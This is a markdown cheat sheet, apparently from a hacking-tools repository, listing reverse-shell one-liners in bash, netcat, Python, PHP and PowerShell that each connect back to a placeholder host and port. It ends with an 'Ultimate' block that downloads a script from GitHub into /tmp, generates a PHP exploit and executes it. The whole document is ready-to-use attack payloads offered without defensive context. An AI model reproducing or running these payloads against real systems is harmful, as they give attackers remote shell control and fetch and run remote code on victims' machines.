### Here are some payloads to spawn a reverse shell

```bash
mkfifo /tmp/expktuy; nc host port 0</tmp/expktuy | /bin/sh >/tmp/expktuy 2>&1; rm /tmp/expktuy
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp port >/tmp/f
bash -i >& /dev/tcp/host/port 0>&1
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("host",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("host",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
php -r '$sock=fsockopen("host",port);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("host",port);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("host",port);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("host",port);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("host",port);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("host",port);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
nc -e /bin/bash host port
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc host port >/tmp/f
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('host',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Ultimate :
```bash
rm /tmp/revgen.py
wget -O /tmp/revgen.py https://raw.githubusercontent.com/rea1bacon/H4cX/master/Tools/auto_reverse_shell/autorev.py
rm /tmp/realexploit.php
python3 /tmp/revgen.py {lhost} {lport} realexploit.php
php -f /tmp/realexploit.php
```

Ressoure: 
-me
-metasploit
-pentestmonkey
-payloadallthethings
